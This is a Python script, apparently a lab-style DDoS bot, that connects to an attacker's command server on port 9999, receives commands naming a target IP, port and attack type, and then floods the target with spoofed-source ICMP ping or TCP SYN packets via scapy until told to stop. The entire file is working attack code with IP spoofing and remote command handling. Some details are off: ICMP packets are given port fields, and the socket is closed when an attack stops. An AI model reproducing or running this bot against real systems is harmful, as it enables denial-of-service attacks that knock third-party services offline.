from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP
import socket
import random
import sys
import threading

def fake_ip():
	fakeip = '{}.{}.{}.{}'.format(*__import__('random').sample(range(0,255),4))
	return fakeip

def fake_port():
	fakeport = random.randint(1024, 65535)
	return fakeport

def option(data):
	global target_ip, target_port, ddos_type, start_atk
	if "DDoS".encode() in data:
		target_ip = data.split("_".encode())[1].decode()
		target_port = int(data.split("_".encode())[2].decode())
		ddos_type = data.split("_".encode())[3].decode()
		start_atk = True
		thrd = threading.Thread(target=ddos_atk)
		thrd.start()
		
	elif "Stop".encode() in data or "Exit program".encode() in data:
		start_atk = False

def ddos_atk():
	total = 0
	print("Starting attack...")
	while start_atk == True:
		if ddos_type == "Ping":
			source_port = fake_port()  # source port number
				
			ip_packet = IP()
			ip_packet.src = fake_ip() # random IP address
			ip_packet.dst = target_ip # target IP address
			
			ICMP_packet = ICMP()
			ICMP_packet.sport = source_port # set source port
			ICMP_packet.dport = target_port # set target port
			send(ip_packet/ICMP_packet, verbose=0)
			total += 1
			print("Starting Ping Flood on " + target_ip + ":" + str(target_port) + " Number of packet sent: " + str(total))

		elif ddos_type == "SYN":
			source_port = fake_port() # source port number
			s_eq = random.randint(1000, 9000) # sequence
			w_indow = random.randint(1000, 9000) # get random size

			ip_packet = IP()
			ip_packet.src = fake_ip() # random IP address
			ip_packet.dst = target_ip # target IP address

			TCP_packet = TCP()
			TCP_packet.sport = source_port # set source port
			TCP_packet.dport = target_port # set target port
			TCP_packet.flags = "S" # type of the flag
			TCP_packet.seq = s_eq  # set sequence
			TCP_packet.window = w_indow # set size
			send(ip_packet/TCP_packet, verbose=0)
			total += 1
			print("Starting SYN Flood on " + target_ip + ":" + str(target_port) + " Number of packet sent: " + str(total))
	
	print("Stopping attack...")
	sock.close()
	

target_ip = ""
target_port = 0
ddos_type = ""
start_atk = False

server_ip = "localhost" # Kali/Attacker's machine
port = 9999 # Kali/Attacker's machine listening port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server_ip, port))
print("Connected successfully!")

while True:
	info = "".encode()

	while info != "Exit program".encode():
		info = sock.recv(1024)
		option(info)

	if info == "Exit program".encode():
		sys.exit()